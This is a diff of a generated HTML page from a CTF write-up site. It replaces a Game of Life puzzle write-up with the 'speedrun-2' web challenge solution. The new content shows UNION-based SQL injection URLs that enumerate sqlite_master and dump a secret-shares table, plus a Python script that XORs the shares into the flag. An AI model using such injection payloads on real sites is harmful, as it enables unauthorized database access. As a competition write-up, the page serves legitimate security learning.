@@ -6,12 +6,12 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
         
-        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/misc/BlueHensCTF/conway/">
-        <link rel="shortcut icon" href="../../../img/favicon.ico">
-        <title>BlueHens CTF - CTF-Writeups</title>
-        <link href="../../../css/bootstrap-custom.min.css" rel="stylesheet">
-        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
-        <link href="../../../css/base.css" rel="stylesheet">
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/web/BlueHensCTF2021/speedrun-2/sp2/">
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>speedrun-2 - CTF-Writeups</title>
+        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atelier-forest-light.min.css">
         <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
         <!--[if lt IE 9]>
@@ -19,8 +19,8 @@
             <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
         <![endif]-->
 
-        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
-        <script src="../../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
@@ -39,7 +39,7 @@
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-                    <a class="navbar-brand" href="../../..">CTF-Writeups</a>
+                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
                 </div>
 
                 <!-- Expanded navigation -->
@@ -47,10 +47,10 @@
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
                             <li >
-                                <a href="../../../about/">About Us</a>
+                                <a href="../../../../about/">About Us</a>
                             </li>
                             <li >
-                                <a href="../../../shaktictf/">ShaktiCTF</a>
+                                <a href="../../../../shaktictf/">ShaktiCTF</a>
                             </li>
                             <li >
                                 <a href="https://team-shakti.github.io/">Website</a>
@@ -64,7 +64,7 @@
                             </a>
                         </li>
                             <li>
-                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/misc/BlueHensCTF/conway.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/web/BlueHensCTF2021/speedrun-2/sp2.md">Edit on Team-Shakti/CTF-Write-ups</a>
                             </li>
                     </ul>
                 </div>
@@ -74,22 +74,41 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#bluehens-ctf">BlueHens CTF</a></li>
-            <li><a href="#conway-presents-the-falcon-misc">Conway presents the falcon - Misc</a></li>
+        <li class="main active"><a href="#speedrun-2">speedrun-2</a></li>
+            <li><a href="#description">Description</a></li>
+            <li><a href="#solution">Solution</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h1 id="bluehens-ctf">BlueHens CTF</h1>
-<h2 id="conway-presents-the-falcon-misc">Conway presents the falcon - Misc</h2>
-<p><img alt="shakti" src="https://github.com/aryaarun12/CTF-Write-ups/blob/master/docs/misc/BlueHensCTF/asset/falcon.png?raw=true" /></p>
-<p><a href="https://github.com/aryaarun12/CTF-Write-ups/blob/master/docs/misc/BlueHensCTF/asset/golly.rle">Challenge file</a></p>
-<ul>
-<li>On browsing about rle files</li>
-<li>Found an <a href="https://copy.sh/life/">online decoder</a> </li>
-<li>Importing the file into it, we directly get the flag..</li>
-</ul>
-<pre><code>UDCTF{th3y_c4ll_thems3lves_the_fl4g_smash3rs}
+<h1 id="speedrun-2">speedrun-2</h1>
+<h2 id="description">Description</h2>
+<p><img alt="b" src="https://user-images.githubusercontent.com/47029515/112105186-1bc1a280-8bd2-11eb-8319-5af0f18dc998.png" /></p>
+<h2 id="solution">Solution</h2>
+<p>Looking at the script it is obvious this is an SQLi.</p>
+<p><img alt="1" src="https://user-images.githubusercontent.com/47029515/112104873-b79ede80-8bd1-11eb-8e94-1fd4c7c1b2b8.png" /></p>
+<p>The course table does not seem to contain any values useful to us. Let's try searching for other tables:</p>
+<p><code>http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,tbl_name+FROM+sqlite_master</code></p>
+<p><img alt="2" src="https://user-images.githubusercontent.com/47029515/112104884-ba99cf00-8bd1-11eb-9d4d-f98b3b731ff9.png" /></p>
+<p>We notice there is table flag_xor_shares that looks interesting. Lets try viewing the structure of the table:</p>
+<p><code>http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,sql+FROM+sqlite_master+where+name=%27flag_xor_shares%27</code></p>
+<p><img alt="3" src="https://user-images.githubusercontent.com/47029515/112110086-6f36ef00-8bd8-11eb-925c-44b34eb8f0c1.png" /></p>
+<p><code>http://challenges.ctfd.io:30026/?credits=1+union+select+id,hexdigest,3,4+from+flag_xor_shares</code></p>
+<p><img alt="Screenshot from 2021-03-21 15-00-36" src="https://user-images.githubusercontent.com/47029515/112104934-cbe2db80-8bd1-11eb-9e82-c7f84ab5a241.png" /></p>
+<p>The contents of the table are secret shares. XORing them together should give us the flag. I wrote a quick script for this</p>
+<pre><code class="python">from pwn import xor
+
+KEY1 = bytes.fromhex(&quot;7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76&quot;)
+KEY2 = bytes.fromhex(&quot;835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1&quot;)
+key3 = bytes.fromhex(&quot;9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c&quot;)
+key4 = bytes.fromhex(&quot;53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3&quot;)
+key5 = bytes.fromhex(&quot;6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35&quot;)
+flag = xor(KEY1, KEY2, key3, key4, key5)
+
+print(flag.decode())
+</code></pre>
+
+<pre><code>UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}
 </code></pre></div>
         </div>
 
@@ -99,12 +118,12 @@
             <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
         </footer>
         <script>
-            var base_url = "../../..",
+            var base_url = "../../../..",
                 shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
         </script>
-        <script src="../../../js/base.js" defer></script>
+        <script src="../../../../js/base.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
-        <script src="../../../search/main.js" defer></script>
+        <script src="../../../../search/main.js" defer></script>
 
         <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
     <div class="modal-dialog">
